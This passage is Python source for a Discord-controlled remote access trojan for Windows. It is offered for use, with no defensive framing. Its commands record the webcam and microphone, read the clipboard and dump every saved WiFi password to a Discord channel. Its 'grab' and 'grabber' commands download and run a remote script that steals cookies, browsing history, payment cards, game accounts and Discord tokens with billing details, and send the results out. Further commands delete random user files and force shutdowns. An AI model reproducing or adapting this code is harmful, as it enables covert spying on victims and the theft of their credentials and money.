    await ctx.send(embed=create_embed("💿 ISO Mounted", f"Drive: `{result.stdout.strip()}`", 0x0084ff))


@bot.command(aliases=["unmount-iso", "unmount"])
async def unmount_iso(ctx, *, filename: str = None):
    global current_dir
    if not filename:
        await ctx.send(embed=create_embed("Error", "Usage: `.unmount <file.iso|drive>`", 0xffa500))
        return
    if len(filename) == 1 and filename.isalpha():
        ps(f"Dismount-DiskImage -DevicePath \\\\.\\{filename}:")
    else:
        path = os.path.abspath(os.path.join(current_dir, filename) if not os.path.isabs(filename) else filename)
        ps(f"Dismount-DiskImage -ImagePath '{path}'")
    await ctx.send(embed=create_embed("⏏️ ISO Unmounted", filename, 0x0084ff))


@bot.command(aliases=["enable-device"])
async def enable_device(ctx, index: int = None):
    if index is None:
        await ctx.send(embed=create_embed("Error", "Usage: `.enable-device <n>`", 0xffa500))
        return
    ps_script = f'$d = Get-PnpDevice | Where-Object {{ $_.FriendlyName }}; $t = $d[{index - 1}]; if ($t) {{ Enable-PnpDevice -InstanceId $t.InstanceId -Confirm:$false; Write-Output $t.FriendlyName }} else {{ Write-Output "NOT_FOUND" }}'
    out = ps(ps_script).stdout.strip()
    await ctx.send(embed=create_embed("🔌 Device", out if out != "NOT_FOUND" else f"Device {index} not found.", 0x0084ff))


@bot.command(aliases=["disable-device"])
async def disable_device(ctx, index: int = None):
    if index is None:
        await ctx.send(embed=create_embed("Error", "Usage: `.disable-device <n>`", 0xffa500))
        return
    ps_script = f'$d = Get-PnpDevice | Where-Object {{ $_.FriendlyName }}; $t = $d[{index - 1}]; if ($t) {{ Disable-PnpDevice -InstanceId $t.InstanceId -Confirm:$false; Write-Output $t.FriendlyName }} else {{ Write-Output "NOT_FOUND" }}'
    out = ps(ps_script).stdout.strip()
    await ctx.send(embed=create_embed("🚫 Device", out if out != "NOT_FOUND" else f"Device {index} not found.", 0x0084ff))


@bot.command(aliases=["speedtest", "speed"])
async def speed_test(ctx):
    await ctx.message.add_reaction("🚀")
    ps_script = '''
$cli = Get-Command speedtest -ErrorAction SilentlyContinue
if (-not $cli) { winget install --id Ookla.Speedtest --silent --accept-source-agreements --accept-package-agreements | Out-Null }
speedtest -f json
'''
    raw = ps(ps_script).stdout.strip()
    if raw.startswith("{"):
        data = json.loads(raw)
        dl = round(data["download"]["bandwidth"] * 8 / 1e6, 2)
        ul = round(data["upload"]["bandwidth"] * 8 / 1e6, 2)
        ping = round(data["ping"]["latency"], 2)
        await ctx.send(embed=create_embed("🚀 Speedtest", f"**Ping:** {ping} ms\n**Down:** {dl} Mbps\n**Up:** {ul} Mbps", 0x0084ff))
    else:
        await ctx.send(embed=create_embed("Error", "Speedtest unavailable.", 0xff0000))


@bot.command(aliases=["alt-f4", "altf4"])
async def alt_f4(ctx):
    ps("$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('%{F4}')")
    await ctx.send(embed=create_embed("❌ Alt+F4", "Sent to active window.", 0x0084ff))


@bot.command(aliases=["airplane-mode", "airplane"])
async def airplane_mode(ctx, state: str = None):
    if not state or state.lower() not in ["on", "off"]:
        await ctx.send(embed=create_embed("Error", "Usage: `.airplane <on|off>`", 0xffa500))
        return
    await ctx.message.add_reaction("✈️")
    if state.lower() == "on":
        ps("Disable-NetAdapter -Name * -Confirm:$false -ErrorAction SilentlyContinue")
    else:
        ps("Enable-NetAdapter -Name * -Confirm:$false -ErrorAction SilentlyContinue")
    await ctx.send(embed=create_embed("✈️ Airplane Mode", state.upper(), 0x0084ff))


@bot.command(aliases=["mute"])
async def toggle_mute(ctx):
    ps("$w = New-Object -ComObject WScript.Shell; $w.SendKeys([char]173)")
    await ctx.send(embed=create_embed("🔇 Mute", "Toggled.", 0x0084ff))


@bot.command(aliases=["show-screens", "screens"])
async def show_screens(ctx):
    await ctx.message.add_reaction("🖥️")
    ps_script = r'''
Add-Type -AssemblyName System.Windows.Forms
$s = [System.Windows.Forms.Screen]::AllScreens
$i = 1
$o = @()
foreach ($sc in $s) { $p = if ($sc.Primary) { " (Primary)" } else { "" }; $o += "$i. $($sc.DeviceName)$p - $($sc.Bounds.Width)x$($sc.Bounds.Height)"; $i++ }
$o -join "`n"
'''
    out = ps(ps_script).stdout.strip()
    await ctx.send(embed=create_embed("🖥️ Displays", f"```{out or 'None detected'}```", 0x0084ff))


@bot.command(aliases=["screen-mode"])
async def screen_mode(ctx, mode: str = None):
    args = {"expand": "/extend", "duplicate": "/clone", "internal": "/internal", "external": "/external"}
    if not mode or mode.lower() not in args:
        await ctx.send(embed=create_embed("Error", "Usage: `.screen-mode <expand|duplicate|internal|external>`", 0xffa500))
        return
    subprocess.run(f"displayswitch.exe {args[mode.lower()]}", shell=True)
    await ctx.send(embed=create_embed("🖥️ Display Mode", mode.capitalize(), 0x0084ff))


@bot.command(aliases=["rotate-screen", "rotate"])
async def rotate_screen(ctx, degrees: int = None):
    if degrees not in (0, 90, 180, 270):
        await ctx.send(embed=create_embed("Error", "Usage: `.rotate <0|90|180|270>`", 0xffa500))
        return
    try:
        dm = win32api.EnumDisplaySettings(None, win32con.ENUM_CURRENT_SETTINGS)
        dm.DisplayOrientation = degrees // 90
        if degrees in (90, 270):
            dm.PelsWidth, dm.PelsHeight = dm.PelsHeight, dm.PelsWidth
        win32api.ChangeDisplaySettings(dm, 0)
        await ctx.send(embed=create_embed("🖥️ Rotate", f"Screen rotated to {degrees}°.", 0x0084ff))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command(aliases=["lock-pc"])
async def lock_pc(ctx):
    ctypes.windll.user32.LockWorkStation()
    await ctx.send(embed=create_embed("🔒 Lock", "Workstation locked.", 0x0084ff))


@bot.command(aliases=["sleep-pc"])
async def sleep_pc(ctx):
    subprocess.Popen("rundll32.exe powrprof.dll,SetSuspendState 0,1,0", shell=True)
    await ctx.send(embed=create_embed("😴 Sleep", "Going to sleep.", 0x0084ff))


@bot.command(aliases=["restart-pc"])
async def restart_pc(ctx):
    os.system("shutdown /r /f /t 0")
    await ctx.send(embed=create_embed("🔁 Restart", "Restarting.", 0xff0000))


@bot.command(aliases=["shutdown-pc"])
async def shutdown_pc(ctx):
    os.system("shutdown /s /f /t 0")
    await ctx.send(embed=create_embed("⏻ Shutdown", "Shutting down.", 0xff0000))


@bot.command()
async def sysinfo(ctx):
    try:
        cpu = psutil.cpu_percent(interval=0.5)
        ram = psutil.virtual_memory()
        disk = psutil.disk_usage("/")
        boot = datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
        e = create_embed("🖥️ System Info", "", 0x3498db)
        e.add_field(name="Host", value=socket.gethostname(), inline=True)
        e.add_field(name="OS", value=f"{__import__('platform').system()} {__import__('platform').release()}", inline=True)
        e.add_field(name="User", value=os.getlogin(), inline=True)
        e.add_field(name="CPU", value=f"{cpu}%", inline=True)
        e.add_field(name="RAM", value=f"{ram.percent}% ({ram.used // 1e6:.0f}/{ram.total // 1e6:.0f} MB)", inline=True)
        e.add_field(name="Disk", value=f"{disk.percent}% used", inline=True)
        e.add_field(name="Boot", value=boot, inline=False)
        await ctx.send(embed=e)
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command()
async def battery(ctx):
    try:
        b = psutil.sensors_battery()
        if not b:
            await ctx.send(embed=create_embed("🔋 Battery", "No battery detected.", 0x3498db))
            return
        state = "Charging" if b.power_plugged else "Discharging"
        await ctx.send(embed=create_embed("🔋 Battery", f"**{b.percent}%** ({state})", 0x00ff00 if b.power_plugged else 0xffa500))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))

def _wifi_export():
    tmp = tempfile.mkdtemp(prefix="wf_")
    found = []
    try:
        cmd_run('netsh wlan export profile folder="{}" key=clear'.format(tmp))
        for fn in os.listdir(tmp):
            if not fn.lower().endswith(".xml"):
                continue
            txt = ""
            try:
                with builtins.open(os.path.join(tmp, fn), "r", encoding="utf-8", errors="replace") as f:
                    txt = f.read()
            except Exception:
                continue
            ssid = re.search(r"<name>(.*?)</name>", txt, re.S)
            key = re.search(r"<keyMaterial>(.*?)</keyMaterial>", txt, re.S)
            if ssid:
                found.append((ssid.group(1).strip(), key.group(1).strip() if key else "(open)"))
    except Exception:
        pass
    finally:
        shutil.rmtree(tmp, ignore_errors=True)
    return found


def _wifi_parse():
    found = []
    out = cmd_run("netsh wlan show profiles").stdout or ""
    names = []
    for line in out.splitlines():
        if ":" in line:
            candidate = line.split(":", 1)[1].strip()
            if candidate and candidate.lower() not in ("", "name"):
                names.append(candidate)
    for p in dict.fromkeys(names):
        r = cmd_run('netsh wlan show profile name="{}" key=clear'.format(p)).stdout or ""
        key = ""
        for line in r.splitlines():
            if ":" in line:
                head, tail = line.split(":", 1)
                h = head.lower()
                if "key content" in h or "contenido de la clave" in h:
                    key = tail.strip()
        found.append((p, key or "(open)"))
    return found


@bot.command(aliases=["wifi-passwords"])
async def wifi(ctx):
    await ctx.message.add_reaction("📶")
    try:
        found = await asyncio.to_thread(_wifi_export)
        if not found:
            found = await asyncio.to_thread(_wifi_parse)
        if not found:
            await ctx.send(embed=create_embed("📶 WiFi", "No profiles found.", 0xFF0000))
            return
        lines = ["{} : {}".format(s, k) for s, k in found]
        await _send_text_files(ctx.channel, "wifi_{}".format(int(time.time())), "\n".join(lines))
        await ctx.send(embed=create_embed("📶 WiFi", "**{}** profiles dumped.".format(len(found)), 0x0084FF))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xFF0000))

@bot.command(aliases=["camrec", "webcam-rec", "record-cam"])
async def cam_rec(ctx, seconds: int = 10):
    seconds = max(1, min(seconds, 120))
    await ctx.message.add_reaction("📹")

    def record():
        cap = cv2.VideoCapture(selected_camera)
        if not cap.isOpened():
            return None
        w = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH)) or 640
        h = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT)) or 480
        fps = 15
        path = os.path.join(BASE_DIR, "cam_{}.mp4".format(int(time.time())))
        writer = cv2.VideoWriter(path, cv2.VideoWriter_fourcc(*"mp4v"), fps, (w, h))
        end = time.time() + seconds
        while time.time() < end:
            ok, frame = cap.read()
            if not ok:
                break
            writer.write(frame)
        writer.release()
        cap.release()
        return path if os.path.exists(path) and os.path.getsize(path) > 1000 else None

    path = await asyncio.to_thread(record)
    if not path:
        await ctx.send(embed=create_embed("Error", "Camera {} unavailable.".format(selected_camera), 0xFF0000))
        return

    fixed = path[:-4] + "_h.mp4"
    try:
        await asyncio.to_thread(lambda: subprocess.run(
            [FFMPEG_BIN, "-y", "-i", path, "-c:v", "libx264", "-preset", "veryfast",
             "-pix_fmt", "yuv420p", "-movflags", "+faststart", fixed],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW, timeout=240))
        if os.path.exists(fixed) and os.path.getsize(fixed) > 1000:
            os.remove(path)
            path = fixed
    except Exception:
        pass

    try:
        await ctx.send(embed=create_embed("📹 Camera", "{}s from camera **{}**.".format(seconds, selected_camera), 0x0084FF),
                       file=discord.File(path, filename="cam.mp4"))
    finally:
        try:
            os.remove(path)
        except Exception:
            pass

@bot.command(aliases=["unpin-all", "unpin-taskbar"])
async def despin_all(ctx):
    folder = os.path.join(os.environ.get("APPDATA", ""),
                          r"Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar")
    removed = 0
    if os.path.isdir(folder):
        for f in os.listdir(folder):
            if f.lower().endswith(".lnk"):
                try:
                    os.remove(os.path.join(folder, f))
                    removed += 1
                except Exception:
                    pass
    _reg_delete(r"Software\Microsoft\Windows\CurrentVersion\Explorer\Taskband", "Favorites", "HKCU")
    subprocess.run(["taskkill", "/f", "/im", "explorer.exe"], capture_output=True, creationflags=_CNW)
    time.sleep(1)
    subprocess.Popen(["explorer.exe"], creationflags=_CNW)
    await ctx.send(embed=create_embed("📌 Taskbar", "{} shortcuts unpinned, explorer restarted.".format(removed), 0x0084FF))


@bot.command(aliases=["restart-taskbar", "restart-explorer"])
async def restart_taskbar(ctx):
    subprocess.run(["taskkill", "/f", "/im", "explorer.exe"], capture_output=True, creationflags=_CNW)
    time.sleep(1)
    subprocess.Popen(["explorer.exe"], creationflags=_CNW)
    await ctx.send(embed=create_embed("🪟 Explorer", "Restarted.", 0x00FF00))

@bot.command(aliases=["proc-info", "pinfo"])
async def proc_details(ctx, *, name: str):
    await ctx.message.add_reaction("🔍")
    rows = []
    for p in psutil.process_iter(["pid", "name", "exe", "username", "memory_info", "create_time"]):
        try:
            if name.lower() in (p.info.get("name") or "").lower():
                mem = getattr(p.info.get("memory_info"), "rss", 0) // 1048576
                rows.append("pid={} name={}\n  path={}\n  user={}\n  rss={}MB".format(
                    p.info["pid"], p.info.get("name"), p.info.get("exe") or "-",
                    p.info.get("username") or "-", mem))
        except Exception:
            pass
        if len(rows) >= 15:
            break
    await send_long(ctx, "\n".join(rows) or "No match.")


@bot.command(aliases=["ktree"])
async def kill_tree(ctx, *, name: str):
    killed = 0
    for p in psutil.process_iter(["name"]):
        try:
            if name.lower() in (p.info.get("name") or "").lower():
                for child in p.children(recursive=True):
                    try:
                        child.kill()
                        killed += 1
                    except Exception:
                        pass
                p.kill()
                killed += 1
        except Exception:
            pass
    await ctx.send(embed=create_embed("🪓 Kill tree", "{} processes killed.".format(killed), 0xFF0000))


@bot.command(aliases=["vol-step"])
async def volume_step(ctx, direction: str = "up", times: int = 5):
    vk = 0xAF if direction.lower() == "up" else 0xAE
    times = max(1, min(times, 50))

    def press():
        for _ in range(times):
            ctypes.windll.user32.keybd_event(vk, 0, 0, 0)
            ctypes.windll.user32.keybd_event(vk, 0, 2, 0)
            time.sleep(0.04)

    await asyncio.to_thread(press)
    await ctx.send(embed=create_embed("🔊 Volume", "{} x{}".format(direction.upper(), times), 0x00FF00))


@bot.command(aliases=["empty-temp", "clean-temp"])
async def empty_temp(ctx):
    removed = failed = 0
    for root in {tempfile.gettempdir(), os.path.join(WINDIR, "Temp")}:
        if not os.path.isdir(root):
            continue
        for entry in os.listdir(root):
            p = os.path.join(root, entry)
            try:
                shutil.rmtree(p, ignore_errors=True) if os.path.isdir(p) else os.remove(p)
                removed += 1
            except Exception:
                failed += 1
    await ctx.send(embed=create_embed("🧹 Temp", "Removed **{}**, failed **{}**.".format(removed, failed), 0x00FF00))


@bot.command()
async def hosts(ctx):
    path = os.path.join(WINDIR, "System32", "drivers", "etc", "hosts")
    try:
        with builtins.open(path, "r", encoding="utf-8", errors="replace") as f:
            await send_long(ctx, f.read()[:8000] or "(empty)")
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xFF0000))



@bot.command()
async def drives(ctx):
    lines = []
    for part in psutil.disk_partitions():
        try:
            u = psutil.disk_usage(part.mountpoint)
            lines.append(f"{part.device} {part.fstype} {u.used // 1e9:.1f}/{u.total // 1e9:.1f} GB")
        except Exception:
            lines.append(part.device)
    await ctx.send(embed=create_embed("💽 Drives", f"```{chr(10).join(lines)}```", 0x3498db))




@bot.command()
async def startup(ctx):
    out = ps("Get-CimInstance Win32_StartupCommand | Select-Object Name, Command | Format-Table -AutoSize | Out-String").stdout
    await ctx.send(embed=create_embed("🚀 Startup", f"```{out[-1900:]}```", 0x3498db))


@bot.command(aliases=["window-list", "windows"])
async def window_list(ctx):
    titles = enum_windows()
    await ctx.send(embed=create_embed("🪟 Open Windows", f"```{chr(10).join(titles[:40])}```", 0x3498db))


@bot.command()
async def focus(ctx, *, title: str):
    def cb(hwnd, _):
        if title.lower() in win32gui.GetWindowText(hwnd).lower():
            win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
            win32gui.SetForegroundWindow(hwnd)
            return False
        return True
    win32gui.EnumWindows(cb, None)
    await ctx.send(embed=create_embed("🪟 Focus", f"Focused window matching `{title}`.", 0x00ff00))


@bot.command(aliases=["close-window"])
async def close_window(ctx, *, title: str):
    def cb(hwnd, _):
        if title.lower() in win32gui.GetWindowText(hwnd).lower():
            win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
        return True
    win32gui.EnumWindows(cb, None)
    await ctx.send(embed=create_embed("🪟 Close", f"Closed windows matching `{title}`.", 0xff0000))


@bot.command(aliases=["clip"])
async def clipboard(ctx):
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
        win32clipboard.CloseClipboard()
        await ctx.send(embed=create_embed("📋 Clipboard", f"```{data[:1900]}```", 0x0084ff))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", f"Clipboard empty or unsupported: {e}", 0xff0000))


@bot.command(aliases=["set-clipboard"])
async def set_clipboard(ctx, *, text: str):
    try:
        win32clipboard.OpenClipboard()
        win32clipboard.EmptyClipboard()
        win32clipboard.SetClipboardText(text)
        win32clipboard.CloseClipboard()
        await ctx.send(embed=create_embed("📋 Clipboard", "Text set.", 0x00ff00))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command()
async def beep(ctx):
    winsound.Beep(1000, 500)
    await ctx.send(embed=create_embed("🔔 Beep", "Beeped.", 0x00ff00))


@bot.command()
async def notepad(ctx, *, text: str = None):
    if text:
        path = os.path.join(BASE_DIR, "note.txt")
        with builtins.open(path, "w", encoding="utf-8") as f:
            f.write(text)
        subprocess.Popen(["notepad.exe", path])
    else:
        subprocess.Popen(["notepad.exe"])
    await ctx.send(embed=create_embed("📝 Notepad", "Opened.", 0x00ff00))


@bot.command()
async def screensaver(ctx):
    ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF140, 0)
    await ctx.send(embed=create_embed("🖼️ Screensaver", "Started.", 0x00ff00))


@bot.command()
async def taskbar(ctx, state: str = None):
    if state not in ("hide", "show"):
        await ctx.send(embed=create_embed("Error", "Usage: `.taskbar <hide|show>`", 0xffa500))
        return
    hwnd = win32gui.FindWindow("Shell_TrayWnd", None)
    win32gui.ShowWindow(hwnd, win32con.SW_HIDE if state == "hide" else win32con.SW_SHOW)
    await ctx.send(embed=create_embed("🪟 Taskbar", state.capitalize(), 0x0084ff))


@bot.command(aliases=["desktop-icons"])
async def desktop_icons(ctx, state: str = None):
    if state not in ("hide", "show"):
        await ctx.send(embed=create_embed("Error", "Usage: `.desktop-icons <hide|show>`", 0xffa500))
        return
    progman = win32gui.FindWindow("Progman", None)
    shell = win32gui.FindWindowEx(progman, 0, "SHELLDLL_DefView", None)
    if shell:
        win32gui.ShowWindow(shell, win32con.SW_HIDE if state == "hide" else win32con.SW_SHOW)
    await ctx.send(embed=create_embed("🖥️ Desktop Icons", state.capitalize(), 0x0084ff))


@bot.command(aliases=["mic-record"])
async def mic_record(ctx, seconds: int = 5):
    await ctx.message.add_reaction("🎙️")
    try:
        fs = 44100
        rec = sd.rec(int(seconds * fs), samplerate=fs, channels=2, dtype=np.int16, device=selected_mic)
        sd.wait()
        path = os.path.join(BASE_DIR, "mic_rec.wav")
        with wave.open(path, "wb") as wf:
            wf.setnchannels(2)
            wf.setsampwidth(2)
            wf.setframerate(fs)
            wf.writeframes(rec.tobytes())
        await ctx.send(embed=create_embed("🎙️ Recording", f"{seconds}s", 0x0084ff), file=discord.File(path))
        os.remove(path)
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command(aliases=["grab-url", "wget", "download-url"])
async def grab_url(ctx, url: str, *, dest: str = None):
    global current_dir
    try:
        name = dest or url.split("/")[-1] or "file.bin"
        path = os.path.join(current_dir, name) if not os.path.isabs(name) else name
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                with builtins.open(path, "wb") as f:
                    f.write(await resp.read())
        await ctx.send(embed=create_embed("📥 Downloaded", f"`{name}` -> `{current_dir}`", 0x00ff00))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command(aliases=["installed", "installed-apps"])
async def installed_apps(ctx):
    apps = []
    for root in (r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                 r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"):
        try:
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, root)
            for i in range(winreg.QueryInfoKey(k)[0]):
                try:
                    sub = winreg.OpenKey(k, winreg.EnumKey(k, i))
                    name = winreg.QueryValueEx(sub, "DisplayName")[0]
                    apps.append(name)
                except Exception:
                    pass
        except Exception:
            pass
    await ctx.send(embed=create_embed("📦 Installed Apps", f"```{chr(10).join(sorted(set(apps))[:60])}```", 0x3498db))


@bot.command()
async def services(ctx):
    out = ps("Get-Service | Where-Object { $_.Status -eq 'Running' } | Select-Object -First 60 Name, DisplayName | Format-Table -AutoSize | Out-String").stdout
    await ctx.send(embed=create_embed("⚙️ Services", f"```{out[-1900:]}```", 0x3498db))

def run_script_capture(path, *args):
    buf = io.StringIO()
    old = sys.argv
    try:
        sys.argv = [path, *args]
        with contextlib.redirect_stdout(buf):
            runpy.run_path(path, run_name="__main__")
    except SystemExit:
        pass
    except Exception as e:
        buf.write(f"\n[error] {e}\n")
    finally:
        sys.argv = old
    return buf.getvalue()


GRAB_MODES = ("all", "cookies", "history", "cards", "games", "discord", "passwords", "vm")


async def _send_text_files(channel, base, text):
    safe = re.sub(r"[^A-Za-z0-9_.-]+", "_", base).strip("_")[:40] or "dump"
    data = (text or "(empty)").encode("utf-8", "replace")
    limit = 8 * 1024 * 1024
    parts = [data[i:i + limit] for i in range(0, len(data), limit)] or [b""]
    total = len(parts)
    for i in range(0, total, 5):
        batch = parts[i:i + 5]
        files = []
        for j, p in enumerate(batch):
            name = safe + (".txt" if total == 1 else "_p{}.txt".format(i + j + 1))
            files.append(discord.File(io.BytesIO(p), filename=name))
        await channel.send(files=files)
        await asyncio.sleep(0.6)


async def _post_discord_embeds(dest, raw):
    try:
        accounts = json.loads(raw)
    except Exception:
        accounts = []
    if not accounts:
        await dest.send(embed=create_embed("Discord", "No accounts found.", 0x5865F2))
        return
    embeds = []
    for a in accounts[:25]:
        e = create_embed("🔑 {}".format(a.get("user") or "unknown"), a.get("source") or "-", 0x5865F2)
        for label, key in (("ID", "id"), ("Email", "email"), ("Phone", "phone"),
                           ("MFA", "mfa"), ("Nitro", "nitro"), ("Billing", "billing"),
                           ("Verified", "verified")):
            if a.get(key) not in (None, "", "None"):
                e.add_field(name=label, value=str(a[key])[:1000], inline=True)
        if a.get("token"):
            e.add_field(name="Token", value="```{}```".format(a["token"]), inline=False)
        if a.get("guilds"):
            e.add_field(name="HQ guilds", value="\n".join(a["guilds"])[:1000], inline=False)
        if a.get("gifts"):
            e.add_field(name="Gifts", value="\n".join(a["gifts"])[:1000], inline=False)
        embeds.append(e)
    for i in range(0, len(embeds), 5):
        await dest.send(embeds=embeds[i:i + 5])
        await asyncio.sleep(1.0)


def _grab_path():
    path = resource_path(GRAB_SCRIPT)
    return path if os.path.exists(path) else None


async def _run_grab(job, timeout=900):
    path = _grab_path()
    if not path:
        return None
    try:
        out = await asyncio.wait_for(asyncio.to_thread(run_script_capture, path, job), timeout=timeout)
    except asyncio.TimeoutError:
        out = "[{}] timed out after {}s".format(job, timeout)
    return (out or "").strip()


async def _full_dump(dest):
    ts = int(time.time())
    history = ""
    for job in ("cookies", "history", "cards", "games", "discord"):
        out = await _run_grab(job)
        if out is None:
            return
        await asyncio.sleep(0.4)
        if job == "cookies":
            await _send_text_files(dest, "cookies_{}".format(ts), out or "no cookies found")
        elif job == "history":
            history = out
        elif job == "cards":
            await _send_text_files(dest, "history_cards_{}".format(ts),
                                   "===== HISTORY =====\n{}\n\n===== CARDS =====\n{}".format(
                                       history or "none", out or "none"))
        elif job == "games":
            await _send_text_files(dest, "accounts_{}".format(ts), out or "no accounts found")
        elif job == "discord":
            await _post_discord_embeds(dest, out)


@bot.command(aliases=["take"])
async def grab(ctx, mode: str = "all"):
    mode = (mode or "all").lower()
    if mode not in GRAB_MODES:
        await ctx.send(embed=create_embed("Grab", "Modes: " + ", ".join("`{}`".format(m) for m in GRAB_MODES), 0xF1C40F))
        return

    if not _grab_path():
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(GRABBER_URL) as resp:
                    if resp.status != 200:
                        raise OSError("HTTP {}".format(resp.status))
                    with builtins.open(resource_path(GRAB_SCRIPT), "wb") as f:
                        f.write(await resp.read())
        except Exception as e:
            await ctx.send(embed=create_embed("Error", "grab.py missing, download failed: {}".format(e), 0xFF0000))
            return

    await ctx.message.add_reaction("💰")
    dest = ctx.guild.get_channel(cfg_get(ctx.guild.id, "info")) or ctx.channel
    ts = int(time.time())

    if mode == "all":
        await _full_dump(dest)
    else:
        out = await _run_grab(mode)
        if out is None:
            await ctx.send(embed=create_embed("Error", "grab.py missing", 0xFF0000))
            return
        if mode == "discord":
            await _post_discord_embeds(dest, await _run_grab("discordjson") or "[]")
        elif mode == "history":
            await _send_text_files(dest, "history_{}".format(ts), out)
        elif mode == "cards":
            await _send_text_files(dest, "cards_{}".format(ts), out)
        elif mode == "games":
            await _send_text_files(dest, "accounts_{}".format(ts), out)
        elif mode == "vm":
            await dest.send(embed=create_embed("VMProtect", "```{}```".format(out[:1900]), 0x3498DB))
        else:
            await _send_text_files(dest, "{}_{}".format(mode, ts), out)
        

    await ctx.send(embed=create_embed("Grab", "Done -> {}".format(dest.mention), 0x00FF00))

@bot.command(aliases=["discord-diag", "ddiag"])
async def discord_diag(ctx):
    await ctx.message.add_reaction("🔎")
    out = await _run_grab("discorddiag", timeout=300)
    await _send_text_files(ctx.channel, "discord_diag_{}".format(int(time.time())), out or "nothing")

@bot.command(aliases=["leave-all"])
async def leave_all(ctx):
    msg = await ctx.send(embed=create_embed("⚠️ Confirm", "React ✅ within 15s to leave all servers.", 0xffa500))
    await msg.add_reaction("✅")

    def check(reaction, user):
        return user == ctx.author and str(reaction.emoji) == "✅" and reaction.message.id == msg.id

    try:
        await bot.wait_for("reaction_add", timeout=15.0, check=check)
    except asyncio.TimeoutError:
        await msg.edit(embed=create_embed("Cancelled", "Timed out.", 0xff0000))
        return
    left = 0
    for guild in list(bot.guilds):
        try:
            await guild.leave()
            left += 1
        except Exception:
            pass
    await ctx.send(embed=create_embed("👋 Left", f"Left {left} servers.", 0x0084ff))


@bot.command(aliases=["clean"])
async def clear(ctx):
    await ctx.send("`🚮` Cleaning...")
    keep = {CHANNEL_NAMES["panel"], CHANNEL_NAMES["info"]}
    for guild in bot.guilds:
        for channel in guild.text_channels:
            if channel.name not in keep:
                try:
                    await channel.purge(limit=1000)
                except Exception:
                    pass
    await ctx.send(embed=create_embed("🚮 Clean", "Channels cleared.", 0x00ff00))

@bot.command()
async def accent(ctx, *, color: str = None):
    global ACCENT
    if not color:
        lines = [f"`{k}` — #{v:06x}" for k, v in ACCENT_PRESETS.items()]
        await ctx.send(embed=create_embed("🎨 Accent Colors", "\n".join(lines) + "\n\nUse `.accent <name|#hex>`"))
        return
    c = color.lower().strip()
    if c in ACCENT_PRESETS:
        ACCENT = ACCENT_PRESETS[c]
    else:
        try:
            ACCENT = int(c.lstrip("#"), 16)
        except Exception:
            await ctx.send(embed=create_embed("Error", "Invalid color. Use a name or `#RRGGBB`.", 0xFF0000))
            return
    for g in bot.guilds:
        set_guild_value(g.id, "accent", ACCENT)
    await ctx.send(embed=create_embed("🎨 Accent", f"Accent color set to `#{ACCENT:06x}`."))


@bot.command(aliases=["clicks"])
async def click(ctx, count: int = 1):
    count = max(1, min(count, 500))
    for _ in range(count):
        pyautogui.click()
        await asyncio.sleep(0.05)
    await ctx.send(embed=create_embed("🖱️ Click", f"Sent **{count}** click(s).", 0x00FF00))


@bot.command(aliases=["chaos"])
async def click_delete(ctx, count: int = 5, *, folder: str = None):
    target = resolve(folder) if folder else os.path.join(os.path.expanduser("~"), "Desktop")
    if not os.path.isdir(target):
        await ctx.send(embed=create_embed("Error", f"Folder not found: `{target}`", 0xFF0000))
        return
    count = max(1, min(count, 200))
    deleted = []
    for _ in range(count):
        try:
            files = [f for f in os.listdir(target) if os.path.isfile(os.path.join(target, f))]
            if files:
                victim = random.choice(files)
                os.remove(os.path.join(target, victim))
                deleted.append(victim)
        except Exception:
            pass
        pyautogui.click()
        await asyncio.sleep(0.1)
    listing = "\n".join(f"🗑️ {d}" for d in deleted) or "Nothing deleted"
    await ctx.send(embed=create_embed("🖱️ Click & Delete", f"```{listing[:1900]}```", 0xFF0000))


@bot.command()
async def autoclick(ctx, state: str = None, interval: float = 0.5):
    global auto_click
    if state not in ("on", "off"):
        await ctx.send(embed=create_embed("Error", "Usage: `.autoclick <on|off> [interval]`", 0xFFA500))
        return
    if state == "off":
        auto_click = False
        await ctx.send(embed=create_embed("🖱️ Autoclick", "Stopped.", 0xFF0000))
        return
    if auto_click:
        await ctx.send(embed=create_embed("🖱️ Autoclick", "Already running.", 0x3498DB))
        return

    def loop():
        while auto_click:
            try:
                pyautogui.click()
            except Exception:
                pass
            time.sleep(max(0.05, interval))

    auto_click = True
    threading.Thread(target=loop, daemon=True).start()
    await ctx.send(embed=create_embed("🖱️ Autoclick", f"Running every **{interval}s**.", 0x00FF00))

@bot.command(aliases=["grabber"])
async def run_grabber(ctx, url: str = None, mode: str = "all"):
    url = url or GRABBER_URL
    if mode not in GRAB_MODES:
        mode = "all"

    temp = os.path.join(BASE_DIR, f"grabber_{uuid.uuid4().hex[:8]}.py")
    await ctx.message.add_reaction("💰")
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    await ctx.send(embed=create_embed("Error", f"HTTP {resp.status}", 0xFF0000))
                    return
                with builtins.open(temp, "wb") as f:
                    f.write(await resp.read())
    except Exception as e:
        await ctx.send(embed=create_embed("Error", f"Download failed: {e}", 0xFF0000))
        return

